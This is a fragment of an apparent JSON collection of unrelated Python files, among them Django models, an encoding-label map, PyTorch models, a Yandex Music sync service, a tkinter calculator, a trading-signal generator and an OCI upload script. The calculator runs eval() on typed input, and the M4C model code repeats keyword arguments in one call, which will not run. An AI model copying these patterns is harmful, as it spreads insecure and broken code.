ones(1, 3, 224, 224)\n    out = net(input)\n    print(out.shape)\n",
    "import uuid\nfrom django.db import models\n\n# Create your models here.\n\n\nclass CreatedUpdatedModel(models.Model):\n    created_at = models.DateTimeField(auto_now_add=True)\n    updated_at = models.DateTimeField(auto_now=True)\n\n    class Meta:\n        abstract = True\n\n\nclass TaskExecution(CreatedUpdatedModel):\n\n    # APPLIED = 'APPLIED'\n    # REJECTED = 'REJECTED'\n\n    # USER_CHOICES = (\n    #     (APPLIED, APPLIED),\n    #     (REJECTED, REJECTED),\n    # )\n\n\n    # choice = models.CharField(null=False, max_length=32, blank=False, choices=USER_CHOICES)\n\n    # id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)\n    # uuid_id = models.UUIDField(default=uuid.uuid4, editable=False)\n\n    task_name = models.CharField(null=False, max_length=256, blank=False)\n    task_path = models.CharField(null=False, max_length=256, blank=False)\n\n    task_args = models.JSONField(null=False, blank=False, default=list)\n    task_kwargs = models.JSONField(null=False, blank=False, default=dict)\n\n    # asked_at = models.DateTimeField(null=False, blank=True)\n    # started_at = models.DateTimeField(null=False, blank=True)\n    # finished_at = models.DateTimeField(null=False, blank=True)\n\n    # reties = models.IntegerField(null=False, blank=False, default=0)\n    # max_reties = models.IntegerField(null=False, blank=False, default=settings.MAX_RETRIES)\n\n\nclass TaskExecutionTry(CreatedUpdatedModel):\n    task_execution = models.ForeignKey(\n        TaskExecution,\n        on_delete=models.CASCADE,\n        related_name=\"tries\",\n        # blank=True,\n        null=False,\n    )\n    try_number = models.IntegerField(null=False, blank=False, default=1)\n\n    asked_at = models.DateTimeField(auto_now_add=True)\n    started_at = models.DateTimeField(null=True, blank=True)\n    finished_at = models.DateTimeField(null=True, blank=True)\n\n    is_completed = models.BooleanField(null=False, blank=False, default=False)\n    is_success = models.BooleanField(null=False, blank=False, default=False)\n\n    class Meta:\n        unique_together = ['task_execution', 'try_number']\n    # error = models.CharField(null=False, max_length=256, blank=False)\n\n\nclass TaskExecutionResult(CreatedUpdatedModel):\n    task_execution_try = models.OneToOneField(\n        TaskExecutionTry,\n        on_delete=models.CASCADE,\n        related_name=\"result\",\n        # blank=True,\n        # null=False,\n    )\n\n    result = models.JSONField(null=False, blank=False, default=dict)\n",
    "\"\"\"\n\n    webencodings.labels\n    ~~~~~~~~~~~~~~~~~~~\n\n    Map encoding labels to their name.\n\n    :copyright: Copyright 2012 by Simon Sapin\n    :license: BSD, see LICENSE for details.\n\n\"\"\"\n\n# XXX Do not edit!\n# This file is automatically generated by mklabels.py\n\nLABELS = {\n    'unicode-1-1-utf-8':   'utf-8',\n    'utf-8':               'utf-8',\n    'utf8':                'utf-8',\n    '866':                 'ibm866',\n    'cp866':               'ibm866',\n    'csibm866':            'ibm866',\n    'ibm866':              'ibm866',\n    'csisolatin2':         'iso-8859-2',\n    'iso-8859-2':          'iso-8859-2',\n    'iso-ir-101':          'iso-8859-2',\n    'iso8859-2':           'iso-8859-2',\n    'iso88592':            'iso-8859-2',\n    'iso_8859-2':          'iso-8859-2',\n    'iso_8859-2:1987':     'iso-8859-2',\n    'l2':                  'iso-8859-2',\n    'latin2':              'iso-8859-2',\n    'csisolatin3':         'iso-8859-3',\n    'iso-8859-3':          'iso-8859-3',\n    'iso-ir-109':          'iso-8859-3',\n    'iso8859-3':           'iso-8859-3',\n    'iso88593':            'iso-8859-3',\n    'iso_8859-3':          'iso-8859-3',\n    'iso_8859-3:1988':     'iso-8859-3',\n    'l3':                  'iso-8859-3',\n    'latin3':              'iso-8859-3',\n    'csisolatin4':         'iso-8859-4',\n    'iso-8859-4':          'iso-8859-4',\n    'iso-ir-110':          'iso-8859-4',\n    'iso8859-4':           'iso-8859-4',\n    'iso88594':            'iso-8859-4',\n    'iso_8859-4':          'iso-8859-4',\n    'iso_8859-4:1988':     'iso-8859-4',\n    'l4':                  'iso-8859-4',\n    'latin4':              'iso-8859-4',\n    'csisolatincyrillic':  'iso-8859-5',\n    'cyrillic':            'iso-8859-5',\n    'iso-8859-5':          'iso-8859-5',\n    'iso-ir-144':          'iso-8859-5',\n    'iso8859-5':           'iso-8859-5',\n    'iso88595':            'iso-8859-5',\n    'iso_8859-5':          'iso-8859-5',\n    'iso_8859-5:1988':     'iso-8859-5',\n    'arabic':              'iso-8859-6',\n    'asmo-708':            'iso-8859-6',\n    'csiso88596e':         'iso-8859-6',\n    'csiso88596i':         'iso-8859-6',\n    'csisolatinarabic':    'iso-8859-6',\n    'ecma-114':            'iso-8859-6',\n    'iso-8859-6':          'iso-8859-6',\n    'iso-8859-6-e':        'iso-8859-6',\n    'iso-8859-6-i':        'iso-8859-6',\n    'iso-ir-127':          'iso-8859-6',\n    'iso8859-6':           'iso-8859-6',\n    'iso88596':            'iso-8859-6',\n    'iso_8859-6':          'iso-8859-6',\n    'iso_8859-6:1987':     'iso-8859-6',\n    'csisolatingreek':     'iso-8859-7',\n    'ecma-118':            'iso-8859-7',\n    'elot_928':            'iso-8859-7',\n    'greek':               'iso-8859-7',\n    'greek8':              'iso-8859-7',\n    'iso-8859-7':          'iso-8859-7',\n    'iso-ir-126':          'iso-8859-7',\n    'iso8859-7':           'iso-8859-7',\n    'iso88597':            'iso-8859-7',\n    'iso_8859-7':          'iso-8859-7',\n    'iso_8859-7:1987':     'iso-8859-7',\n    'sun_eu_greek':        'iso-8859-7',\n    'csiso88598e':         'iso-8859-8',\n    'csisolatinhebrew':    'iso-8859-8',\n    'hebrew':              'iso-8859-8',\n    'iso-8859-8':          'iso-8859-8',\n    'iso-8859-8-e':        'iso-8859-8',\n    'iso-ir-138':          'iso-8859-8',\n    'iso8859-8':           'iso-8859-8',\n    'iso88598':            'iso-8859-8',\n    'iso_8859-8':          'iso-8859-8',\n    'iso_8859-8:1988':     'iso-8859-8',\n    'visual':              'iso-8859-8',\n    'csiso88598i':         'iso-8859-8-i',\n    'iso-8859-8-i':        'iso-8859-8-i',\n    'logical':             'iso-8859-8-i',\n    'csisolatin6':         'iso-8859-10',\n    'iso-8859-10':         'iso-8859-10',\n    'iso-ir-157':          'iso-8859-10',\n    'iso8859-10':          'iso-8859-10',\n    'iso885910':           'iso-8859-10',\n    'l6':                  'iso-8859-10',\n    'latin6':              'iso-8859-10',\n    'iso-8859-13':         'iso-8859-13',\n    'iso8859-13':          'iso-8859-13',\n    'iso885913':           'iso-8859-13',\n    'iso-8859-14':         'iso-8859-14',\n    'iso8859-14':          'iso-8859-14',\n    'iso885914':           'iso-8859-14',\n    'csisolatin9':         'iso-8859-15',\n    'iso-8859-15':         'iso-8859-15',\n    'iso8859-15':          'iso-8859-15',\n    'iso885915':           'iso-8859-15',\n    'iso_8859-15':         'iso-8859-15',\n    'l9':                  'iso-8859-15',\n    'iso-8859-16':         'iso-8859-16',\n    'cskoi8r':             'koi8-r',\n    'koi':                 'koi8-r',\n    'koi8':                'koi8-r',\n    'koi8-r':              'koi8-r',\n    'koi8_r':              'koi8-r',\n    'koi8-u':              'koi8-u',\n    'csmacintosh':         'macintosh',\n    'mac':                 'macintosh',\n    'macintosh':           'macintosh',\n    'x-mac-roman':         'macintosh',\n    'dos-874':             'windows-874',\n    'iso-8859-11':         'windows-874',\n    'iso8859-11':          'windows-874',\n    'iso885911':           'windows-874'",
    "from models.modules import *\nimport torch\nimport torchvision\nimport torchvision.transforms as T\nimport torch.nn as nn\nimport torch.nn.functional as F\nfrom timm.models.layers import trunc_normal_, DropPath\nfrom timm import create_model\n\n\n\nclass UNeXt(nn.Module):\n    '''\n    UNeXt module, a ConvNeXt based U-Net architecture. \n    '''\n    def __init__(self, noc, model_name=\"convnext_tiny_in22ft1k\", in_channels=3, device=None):\n        super().__init__()\n        if device is None:\n           device = 'cuda' if torch.cuda.is_available() else 'cpu'\n        convnext = create_model(model_name, pretrained=True).to(device)\n        print('load pretrain weight successful!')      \n        # shapes = {\n        #     'convnext_xlarge_in22k': [256, 512, 1024, 2048],\n        #     'convnext_large_22k': [192, 384, 768, 1536],\n        #     'convnext_base_22k': [128, 256, 512, 1024],\n        #     'convnext_small_22k': [96, 192, 384, 768],\n        #     'convnext_tiny_22k': [96, 192, 384, 768]\n        # }\n        self.input = nn.Conv2d(in_channels, 3, 3, padding=1)\n        self.encoder = Encoder(convnext)\n        dim = convnext.head.norm.weight.shape[0]\n        self.bridge = Bridge(dim)\n        self.decoder = Decoder(dim, noc)\n        self.device = device\n    def forward(self, x):\n        x = self.input(x)\n        enc, pools = self.encoder(x)\n        bridge_out = self.bridge(enc)\n        out = self.decoder(bridge_out, pools)\n        return out\n    def to(self, *args, **kwargs):\n        self = super().to(*args, **kwargs)\n        self.encoder = self.encoder.to(*args, **kwargs)\n        self.bridge = self.bridge.to(*args, **kwargs)\n        self.decoder = self.decoder.to(*args, **kwargs)\n        return self\n\nif __name__ == '__main__':\n    # model_name = \"convnext_xlarge_in22k\"\n    # device = 'cuda' if torch.cuda.is_available() else 'cpu'\n    # print(\"device = \", device)\n    # # create a ConvNeXt model : https://github.com/rwightman/pytorch-image-models/blob/master/timm/models/convnext.py\n    # model = create_model(model_name, pretrained=True).to(device)\n    # from timm.data.constants import \\\n    # IMAGENET_DEFAULT_MEAN, IMAGENET_DEFAULT_STD\n\n    # NORMALIZE_MEAN = IMAGENET_DEFAULT_MEAN\n    # NORMALIZE_STD = IMAGENET_DEFAULT_STD\n    # SIZE = 256\n\n    # # Here we resize smaller edge to 256, no center cropping\n    # transforms = [\n    #               T.Resize(SIZE, interpolation=T.InterpolationMode.BICUBIC),\n    #               T.ToTensor(),\n    #               T.Normalize(NORMALIZE_MEAN, NORMALIZE_STD),\n    #               ]\n\n    # transforms = T.Compose(transforms)\n    # imagenet_labels = json.load(open('label_to_words.json'))\n    # img = PIL.Image.open('test.jpeg')\n    # img_tensor = transforms(img).unsqueeze(0).to(device)\n    unext = UNeXt(3)\n    unext = unext.to(unext.device)\n    # out = unext(img_tensor)\n    # print(out.shape)\n    print(unext)\n    # torchvision.utils.save_image(out.squeeze().detach().cpu(), 'test.png')\n",
    "from yandex_music import Client\nfrom constants import YA_TOKEN\nfrom utilities import TrackManager, LoggerSetup\nfrom typing import List, Dict\nimport json\n\n\nclass YandexService:\n    def __init__(self):\n        self.client = Client(YA_TOKEN).init()\n        self.logger = LoggerSetup.setup_logger()\n\n    def fetch_and_refresh_tracks(self):\n        self.logger.info(\"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0442\u0440\u0435\u043a\u043e\u0432 \u0438\u0437 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0438...\")\n        filename = 'yandex_tracks.json'\n        track_manager = TrackManager(filename)\n        liked_tracks = self.client.users_likes_tracks().fetchTracks()\n        track_manager.refresh_tracks(liked_tracks, 'yandex')\n        self.logger.info(\"\u0422\u0440\u0435\u043a\u0438 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0438 \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u044b.\")\n\n    def add_to_yandex(self, tracks: List[Dict]):\n        for track in tracks:\n            try:\n                search_result = self.client.search(f\"{track['artist']} {track['track_name']}\")\n                if search_result.tracks is None:\n                    self.logger.warning(\n                        f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n                    continue\n                track_id = search_result.tracks['results'][0]['id']\n                self.logger.info(\n                    f\"\u0414\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u0442\u0440\u0435\u043a\u0430 {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u0432 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0443...\")\n                self.client.users_likes_tracks_add([track_id])\n            except IndexError:\n                self.logger.warning(\n                    f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n            except TypeError:\n                self.logger.warning(\n                    f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n\n    def delete_from_yandex(self, tracks: List[Dict]):\n        deleted_tracks = []\n        for track in tracks:\n            try:\n                try:\n                    search_result = self.client.search(f\"{track['artist']} {track['track_name']}\")\n                except Exception as e:\n                    self.logger.warning(\n                        f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n                    continue\n                if search_result.tracks is None:\n                    self.logger.warning(\n                        f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n                    continue\n                track_id = search_result.tracks['results'][0]['id']\n                self.logger.info(\n                    f\"\u0423\u0434\u0430\u043b\u0435\u043d\u0438\u0435 \u0442\u0440\u0435\u043a\u0430 {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u0438\u0437 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0438...\")\n                self.client.users_likes_tracks_remove([track_id])\n                deleted_tracks.append({'id': track_id, 'artist': track['artist'], 'track_name': track['track_name']})\n            except IndexError:\n                self.logger.warning(\n                    f\"\u0422\u0440\u0435\u043a {track['track_name']} \u0438\u0441\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044f {track['artist']} \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d \u043d\u0430 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0435.\")\n        with open('deleted_yandex_tracks.json', 'w', encoding='utf-8') as file:\n            self.logger.info(f\"\u0423\u0434\u0430\u043b\u0435\u043d\u043e {len(deleted_tracks)} \u0438\u0437 \u042f\u043d\u0434\u0435\u043a\u0441 \u041c\u0443\u0437\u044b\u043a\u0438...\")\n            json.dump(deleted_tracks, file, ensure_ascii=False, indent=4)\n",
    "import torch\nfrom torch import nn\nfrom transformers import BertGenerationDecoder, BertGenerationEncoder\n\nfrom models.modules.object_encoder import ObjectEncoder\nfrom models.modules.ocr_encoder import OCREncoder\nfrom utils import get_padding_mask\n\nfrom typing import Optional, Tuple\n\nclass M4C(BertGenerationDecoder):\n    def __init__(self, config, pretrained_config):\n        pretrained_config = pretrained_config.update({\n            \"is_decoder\": True,\n            \"add_cross_attention\": True\n        })\n        super().__init__(pretrained_config)\n        self.bert.from_pretrained(config.pretrained_name)\n\n        pretrained_config = pretrained_config.update({\n            \"is_decoder\": False,\n            \"add_cross_attention\": False\n        })\n        self.encoder = BertGenerationEncoder(pretrained_config)\n        self.encoder.from_pretrained(config.pretrained_name)\n        self.encoder.set_input_embeddings(self.bert.get_input_embeddings())\n\n        self.object_encoder = ObjectEncoder(\n            config.object_in_dim,\n            pretrained_config.d_model,\n            pretrained_config.dropout\n        )\n        self.ocr_encoder = OCREncoder(\n            config.ocr_in_dim,\n            pretrained_config.d_model,\n            pretrained_config.dropout\n        )\n        self.masked_vision_value = config.masked_vision_value\n\n    def forward(\n            self,\n            input_ids: Optional[torch.Tensor] = None,\n            attention_mask: Optional[torch.Tensor] = None,\n            object_features: Optional[torch.Tensor] = None,\n            object_boxes: Optional[torch.Tensor] = None,\n            ocr_boxes: Optional[torch.Tensor] = None,\n            ocr_tokens: Optional[torch.Tensor] = None,\n            ocr_det_features: Optional[torch.Tensor] = None,\n            ocr_rec_features: Optional[torch.Tensor] = None,\n            caption_tokens: Optional[torch.Tensor] = None,\n            caption_mask: Optional[torch.Tensor] = None,\n            position_ids: Optional[torch.Tensor] = None,\n            head_mask: Optional[torch.Tensor] = None,\n            inputs_embeds: Optional[torch.Tensor] = None,\n            encoder_hidden_states: Optional[torch.Tensor] = None,\n            encoder_attention_mask: Optional[torch.Tensor] = None,\n            labels: Optional[torch.Tensor] = None,\n            past_key_values: Optional[Tuple[Tuple[torch.FloatTensor]]] = None,\n            use_cache: Optional[bool] = None,\n            output_attentions: Optional[bool] = None,\n            output_hidden_states: Optional[bool] = None,\n            return_dict: Optional[bool] = None\n    ):\n        obj_feats = self.object_encoder(\n            object_boxes,\n            object_features\n        )\n        obj_mask = get_padding_mask(obj_feats, self.masked_vision_value)\n\n        ocr_feats = self.ocr_encoder(\n            ocr_boxes,\n            ocr_tokens,\n            ocr_rec_features,\n            ocr_det_features\n        )\n        ocr_mask = get_padding_mask(ocr_feats, self.masked_vision_value)\n\n        input_embs = torch.cat([obj_feats, ocr_feats], dim=1)\n        input_mask = torch.cat([obj_mask, ocr_mask], dim=1)\n\n        encoder_outputs = self.encoder(\n            inputs_embeds=input_embs,\n            attention_mask=input_mask\n        ).hidden_states\n\n        return super().forward(\n            input_ids=caption_tokens,\n            attention_mask=caption_mask,\n            encoder_hidden_states=encoder_outputs,\n            encoder_attention_mask=input_mask,\n            position_ids=position_ids,\n            head_mask=head_mask,\n            inputs_embeds=input_embs,\n            encoder_hidden_states=encoder_hidden_states,\n            encoder_attention_mask=encoder_attention_mask,\n            labels=caption_tokens,\n            past_key_values=past_key_values,\n            use_cache=use_cache,\n            output_attentions=output_attentions,\n            output_hidden_states=output_hidden_states,\n            return_dict=return_dict,\n        )\n\n    def prepare_inputs_for_generation(self, input_ids, past_key_values=None, attention_mask=None, **model_kwargs):\n        input_shape = input_ids.shape\n        # if model is used as a decoder in encoder-decoder model, the decoder attention mask is created on the fly\n        if attention_mask is None:\n            attention_mask = input_ids.new_ones(input_shape)\n\n        # cut decoder_input_ids if past is used\n        if past_key_values is not None:\n            input_ids = input_ids[:, -1:]\n\n        return {\n            \"input_ids\": input_ids, \n            \"attention_mask\": attention_mask, \n            \"past_key_values\": past_key_values,\n            **model_kwargs\n        }\n",
    "import tkinter as tk\n\n# \u0130fadeyi g\u00fcncellemek i\u00e7in bir fonksiyon olu\u015ftur\ndef press(num):\n    current = expression.get()\n    expression.set(current + str(num))\n\n# Sonucu hesaplamak i\u00e7in bir fonksiyon olu\u015ftur\ndef equalpress():\n    try:\n        total = str(eval(expression.get()))\n        expression.set(total)\n    except:\n        expression.set(\"Hata\")\n        entry.update()\n\n# Alan\u0131 temizlemek i\u00e7in bir fonksiyon olu\u015ftur\ndef clear():\n    expression.set(\"\")\n\n# Ana pencereyi olu\u015ftur\nroot = tk.Tk()\nroot.title(\"Hesap Makinesi\")\n\n# StringVar() de\u011fi\u015fken s\u0131n\u0131f\u0131n\u0131 kullan\nexpression = tk.StringVar()\n\n# \u0130fadeyi g\u00f6stermek i\u00e7in bir giri\u015f alan\u0131 olu\u015ftur\nentry = tk.Entry(root, textvariable=expression)\nentry.grid(columnspan=4, ipadx=70)\n\n# Hesap makinesi i\u00e7in d\u00fc\u011fmeleri olu\u015ftur\nbutton1 = tk.Button(root, text=' 1 ', command=lambda: press(1), height=1, width=7)\nbutton1.grid(row=2, column=0)\n\nbutton2 = tk.Button(root, text=' 2 ', command=lambda: press(2), height=1, width=7)\nbutton2.grid(row=2, column=1)\n\nbutton3 = tk.Button(root, text=' 3 ', command=lambda: press(3), height=1, width=7)\nbutton3.grid(row=2, column=2)\n\nbutton4 = tk.Button(root, text=' 4 ', command=lambda: press(4), height=1, width=7)\nbutton4.grid(row=3, column=0)\n\nbutton5 = tk.Button(root, text=' 5 ', command=lambda: press(5), height=1, width=7)\nbutton5.grid(row=3, column=1)\n\nbutton6 = tk.Button(root, text=' 6 ', command=lambda: press(6), height=1, width=7)\nbutton6.grid(row=3, column=2)\n\nbutton7 = tk.Button(root, text=' 7 ', command=lambda: press(7), height=1, width=7)\nbutton7.grid(row=4, column=0)\n\nbutton8 = tk.Button(root, text=' 8 ', command=lambda: press(8), height=1, width=7)\nbutton8.grid(row=4, column=1)\n\nbutton9 = tk.Button(root, text=' 9 ', command=lambda: press(9), height=1, width=7)\nbutton9.grid(row=4, column=2)\n\nbutton0 = tk.Button(root, text=' 0 ', command=lambda: press(0), height=1, width=7)\nbutton0.grid(row=5, columnspan=1)\n\nplus = tk.Button(root, text=' + ', command=lambda: press(\"+\"), height=1, width=7)\nplus.grid(row=2, column=3)\n\nminus = tk.Button(root, text=' - ', command=lambda: press(\"-\"), height=1, width=7)\nminus.grid(row=3, column=3)\n\nmultiply = tk.Button(root, text=' * ', command=lambda: press(\"*\"), height=1, width=7)\nmultiply.grid(row=4, column=3)\n\ndivide = tk.Button(root, text=' / ', command=lambda: press(\"/\"), height=1, width=7)\ndivide.grid(row=5, column=3)\n\nequal = tk.Button(root, text=' = ', command=equalpress, height=1, width=7)\nequal.grid(row=5, column=2)\n\nclear = tk.Button(root, text='Temizle', command=clear, height=1, width=7)\nclear.grid(row=1, column=0)\n\nDecimal = tk.Button(root, text='.', command=lambda: press('.'), height=1, width=7)\nDecimal.grid(row=5, column=1)\n\n# GUI'yi ba\u015flat\nroot.mainloop()\n",
    "import os\r\nimport sys\r\nimport pandas as pd\r\nfrom tqdm import tqdm\r\n\r\n\r\nclass SignalGenerator:\r\n    def __init__(self):\r\n        self.positions = {}  # To keep track of current positions for each token\r\n\r\n    def generate_trading_signals(self, df, thresholds):\r\n        \"\"\"\r\n        Generates trading signals based on s-scores, thresholds, and current positions.\r\n\r\n        Parameters:\r\n        df (pd.DataFrame): DataFrame containing the s-scores for all tokens with timestamps.\r\n        thresholds (dict): Dictionary containing the threshold values for signals.\r\n\r\n        Returns:\r\n        pd.DataFrame: DataFrame containing the trading signals for all tokens and timestamps.\r\n        \"\"\"\r\n        # Extract thresholds\r\n        s_bo = thresholds['s_bo']  # Threshold for buying to open\r\n        s_so = thresholds['s_so']  # Threshold for selling to open\r\n        s_bc = thresholds['s_bc']  # Threshold for closing short positions\r\n        s_sc = thresholds['s_sc']  # Threshold for closing long positions\r\n\r\n        # Initialize an empty DataFrame for signals\r\n        tokens, signals, timestamps = [], [], []\r\n\r\n        # Iterate through each timestamp and token\r\n        pbar = tqdm(total=len(df['TimeStamp'].unique()), desc='Determining Signals')\r\n        for timestamp in df['TimeStamp'].unique():\r\n            current_df = df[df['TimeStamp'] == timestamp]\r\n            for index, row in current_df.iterrows():\r\n                token = row['Token']\r\n                s_score = row['score']\r\n                current_position = self.positions.get(token, 'none')\r\n\r\n                if current_position in ['none', 'long'] and s_score <= -s_bo:\r\n                    signal = 'buy to open'\r\n                    self.positions[token] = 'long'\r\n                elif current_position in ['none', 'short'] and s_score > s_so:\r\n                    signal = 'sell to open'\r\n                    self.positions[token] = 'short'\r\n                elif current_position == 'long' and s_score > -s_sc:\r\n                    signal = 'close long position'\r\n                    self.positions[token] = 'none'\r\n                elif current_position == 'short' and s_score < s_bc:\r\n                    signal = 'close short position'\r\n                    self.positions[token] = 'none'\r\n                else:\r\n                    signal = 'hold'\r\n\r\n                tokens.append(token)\r\n                signals.append(signal)\r\n                timestamps.append(timestamp)\r\n\r\n            # Update the progress bar\r\n            pbar.update(1)\r\n\r\n        # Close the progress bar upon completion\r\n        pbar.close()\r\n\r\n        signals_df = pd.DataFrame({'Token': tokens, 'Signal': signals, 'Timestamp': timestamps})\r\n        signals_df.set_index(['Timestamp', 'Token'], inplace=True)\r\n        signals_df = signals_df.unstack()\r\n        signals_df.to_csv('trading_signal.csv')\r\n\r\n        return signals_df",
    "#!/usr/bin/python3\n\nfrom debian import debian_support\nimport oras.provider\nimport hashlib\nimport os\n\noci_repo = os.environ.get(\"OCI_REPO\")\noci_auth_name = os.environ.get(\"OCI_AUTH_NAME\")\n\ndef calculate_sha256(file_path):\n    sha256_hash = hashlib.sha256()\n    with open(file_path, \"rb\") as f:\n        for byte_block in iter(lambda: f.read(4096), b\"\"):\n            sha256_hash.update(byte_block)\n    return sha256_hash.hexdigest()\n\ndef read_repo_file(repo_file):\n    all_pkg_infos = []\n    file_sha256_info_list = []\n    for pkg_info in list(repo_file):\n        pkg_metainfo = {}\n        for tag_value in pkg_info:\n            pkg_metainfo[tag_value[0]] = tag_value[1]\n        all_pkg_infos.append(pkg_metainfo)\n    if \"Filename\" in all_pkg_infos[0]:\n        for all_pkg_info in all_pkg_infos:\n            file_sha256_info = {}\n            file_sha256_info[\"Filename\"] = all_pkg_info[\"Filename\"].strip(\"./\")\n            file_sha256_info[\"SHA256\"] = all_pkg_info[\"SHA256\"]\n            file_sha256_info_list.append(file_sha256_info)\n    elif \"Checksums-Sha256\" in all_pkg_infos[0]:\n        for all_pkg_info in all_pkg_infos:\n            for sha256_info in all_pkg_info[\"Checksums-Sha256\"].split(\"\\n\"):\n                if sha256_info == \"\":\n                    continue\n                file_sha256_info = {}\n                file_sha256_info[\"Filename\"] = sha256_info.split(\" \")[2]\n                file_sha256_info[\"SHA256\"] = sha256_info.split(\" \")[0]\n                file_sha256_info_list.append(file_sha256_info)\n    else:\n        return {}\n    return  file_sha256_info_list\n\ndef upload_blobs_manifest(blob_file_name, blob_file_digest, oci_repo):\n    token = os.environ.get(\"GH_TK\")\n    class MyProvider(oras.provider.Registry):\n        pass\n\n    reg = MyProvider()\n    container = reg.get_container(oci_repo)\n    manifest = reg.get_manifest(container)\n\n    blob = os.path.join(os.getcwd(), blob_file_name)\n    blob_name = os.path.basename(blob)\n    annotset = oras.oci.Annotations({})\n    layer = oras.oci.NewLayer(blob, \"application/octet-stream\", is_dir=False)\n    layer[\"annotations\"] = {oras.defaults.annotation_title: blob_name}\n    reg.set_basic_auth(oci_auth_name, token)\n    print(\"going to upload blob %s\" % blob)\n    print(reg.upload_blob(blob, container, layer))\n\n    new_layers = []\n    for old_layer in manifest[\"layers\"]:\n        if  old_layer[\"annotations\"][oras.defaults.annotation_title] == blob_file_name:\n            print(\"going to delete old %s layer %s\" % (blob_file_name, old_layer))\n        else:\n            if old_layer[\"annotations\"] == {oras.defaults.annotation_title: blob_name} and old_layer[\"digest\"] != \"sha256:\" + blob_file_digest:\n                print(\"going to delete conflict layer %s\" % old_layer)\n            else:\n                new_layers.append(old_layer)\n\n    manifest[\"layers\"] = new_layers\n    manifest[\"layers\"].append(layer)\n    print(\"going to upload manifest\")\n    print(reg.upload_manifest(manifest, container))\n\ndef delete_blobs_manifest(blob_file_name, blob_file_digest, oci_repo):\n    token = os.environ.get(\"GH_TK\")\n    class MyProvider(oras.provider.Registry):\n        pass\n\n    reg = MyProvider()\n    container = reg.get_container(oci_repo)\n    manifest = reg.get_manifest(container)\n    new_layers = []\n    delete_layer = False\n    for old_layer in manifest[\"layers\"]:\n        if blob_file_name == old_layer[\"annotations\"][oras.defaults.annotation_title]:\n            delete_layer = True\n    for old_layer in manifest[\"layers\"]:\n        if delete_layer:\n            if blob_file_name == old_layer[\"annotations\"][oras.defaults.annotation_title]:\n                print(\"%s exist in remote, going to delete\" % blob_file_name)\n            else:\n                new_layers.append(old_layer)\n    manifest[\"layers\"] = new_layers\n    print(\"going to upload manifest\")\n    reg.set_basic_auth(oci_auth_name, token)\n    print(reg.upload_manifest(manifest, container))\n\n\n# Get manifest from remote repo\nclass MyProvider(oras.provider.Registry):\n    pass\n\nreg = MyProvider()\ncontainer = reg.get_container(oci_repo)\nmanifest = reg.get_manifest(container)\n\n# Get remote package file name and digest info from manifest\nremote_file_sha256_infos =  []\nremote_extra_file_sha256_infos =  []\nfor oci_layer in manifest[\"layers\"]:\n    remote_file_sha256_info = {}\n    remote_file_sha256_info[\"Filename\"] = oci_layer[\"annotations\"][\"org.opencontainers.image.title\"]\n    remote_file_sha256_info[\"SHA256\"] = oci_layer[\"digest\"].split(\":\")[1]\n    if oci_layer[\"annotations\"][\"org.opencontainers.image.title\"] == \"Packages\" or oci_layer[\"annotations\"][\"org.opencontainers.image.title\"] == \"Sources\":\n        remote_extra_file_sha256_infos.append(remote_file_sha256_info)\n    else:\n        remote_file_sha256_infos.append(remote_file_sha256_info)\n\n# Read info of packages to upload from local Packages and Sources\npkg_file = debian_support.PackageFile(\"Packages\")\nsource_file = debian_support.PackageFile(\"Sources\")\npackage_info_list = read_repo_file(pkg_file)\nsource_info",
